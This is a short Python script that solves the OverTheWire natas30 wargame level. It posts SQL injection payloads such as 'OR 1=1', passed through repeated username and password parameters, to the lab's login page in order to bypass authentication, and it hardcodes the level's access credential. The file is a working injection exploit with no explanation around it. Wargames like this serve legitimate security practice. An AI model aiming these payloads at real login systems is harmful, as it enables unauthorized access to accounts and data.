import requests


user_auth = ('natas30','wie9iexae0Daihohv8vuu3cei9wahf0e')

target = 'http://natas30.natas.labs.overthewire.org/index.pl'


payload = 'username=natas31&password=2&password=1\' OR 1=1&password=2'
payload2 = 'username=natas31&password=1'
payload3 = "username='natas31' OR '1'='1'&username=3&password='1'"

header = {'Content-Type': 'application/x-www-form-urlencoded'}


response = requests.post(target, auth = user_auth, headers = header, data = payload3.replace(" ", "%20"))

print response.text


